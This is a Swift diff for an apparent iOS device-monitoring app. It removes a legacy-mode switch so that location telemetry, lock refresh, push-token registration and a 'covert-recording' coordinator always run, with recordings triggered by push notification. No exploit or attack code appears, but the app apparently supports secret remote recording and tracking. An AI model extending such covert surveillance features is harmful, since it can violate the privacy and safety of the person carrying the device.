@@ -116,9 +116,7 @@ extension RootView {
 
         guard newValue == .active else { return }
         DeviceRecordingCoordinator.shared.setApplicationActive(true)
-        if !AppRuntime.legacyRootEnabled {
-            OilaTelemetryService.shared.refreshLockNow()
-        }
+        OilaTelemetryService.shared.refreshLockNow()
         RuntimeDiagnosticsCenter.shared.updateLifecycle(
             scenePhase: phase,
             applicationState: applicationState,
@@ -162,26 +160,16 @@ extension RootView {
 
 private extension RootView {
     func syncGeoService(with dsn: String?) {
-        // oila360 mode (default): the REST telemetry pipeline replaces the legacy
-        // WebSocket geo service, and only runs once B1–B11 onboarding is complete —
-        // so no OS permission prompt fires mid-setup.
-        guard AppRuntime.legacyRootEnabled else {
-            geoBackgroundService.stop()
-            // Requires an actual oila360 pairing (tokens), not just a legacy DSN —
-            // otherwise every upload would 401 with no recovery path.
-            if let dsn, !dsn.isEmpty, sessionStore.onboardingCompleted, sessionStore.oilaPaired {
-                OilaTelemetryService.shared.start()
-            } else {
-                OilaTelemetryService.shared.stop()
-            }
-            return
+        // The REST telemetry pipeline replaces the legacy WebSocket geo service, and only
+        // runs once B1–B11 onboarding is complete — so no OS permission prompt fires mid-setup.
+        geoBackgroundService.stop()
+        // Requires an actual oila360 pairing (tokens), not just a legacy DSN —
+        // otherwise every upload would 401 with no recovery path.
+        if let dsn, !dsn.isEmpty, sessionStore.onboardingCompleted, sessionStore.oilaPaired {
+            OilaTelemetryService.shared.start()
+        } else {
+            OilaTelemetryService.shared.stop()
         }
-
-        guard let dsn, !dsn.isEmpty else {
-            geoBackgroundService.stop()
-            return
-        }
-        geoBackgroundService.start(dsn: dsn)
     }
 
     func syncLockService(with dsn: String?, armRecoveryCheck: Bool = false) {
@@ -193,27 +181,18 @@ private extension RootView {
     }
 
     func syncMediaService(with dsn: String?) {
-        // Legacy covert-recording pipeline targets the old backend; in oila360 mode the
-        // trigger arrives via push + PUT /device/recordings/{id}/complete (not yet wired).
-        guard AppRuntime.legacyRootEnabled else {
-            DeviceRecordingCoordinator.shared.start(dsn: nil)
-            return
-        }
-        DeviceRecordingCoordinator.shared.start(dsn: dsn)
+        // The covert-recording trigger arrives via push + PUT /device/recordings/{id}/complete.
+        DeviceRecordingCoordinator.shared.start(dsn: nil)
     }
 
     func syncPushToken(with dsn: String?) async {
-        guard AppRuntime.legacyRootEnabled else {
-            // oila360 mode: register the current push token via PATCH /device/fcm-token —
-            // only once this install has actually paired (otherwise it would just 401).
-            if dsn?.trimmedNonEmpty != nil,
-               sessionStore.oilaPaired,
-               let token = UserDefaults.standard.string(forKey: "PUSH_NOTIFICATION_TOKEN")?.trimmedNonEmpty {
-                try? await OilaDeviceClient.shared.updateFCMToken(token)
-            }
-            return
+        // Register the current push token via PATCH /device/fcm-token — only once this
+        // install has actually paired (otherwise it would just 401).
+        if dsn?.trimmedNonEmpty != nil,
+           sessionStore.oilaPaired,
+           let token = UserDefaults.standard.string(forKey: "PUSH_NOTIFICATION_TOKEN")?.trimmedNonEmpty {
+            try? await OilaDeviceClient.shared.updateFCMToken(token)
         }
-        await PushTokenSyncCoordinator.shared.updateDSN(dsn)
     }
 
     var localServiceDSN: String? {
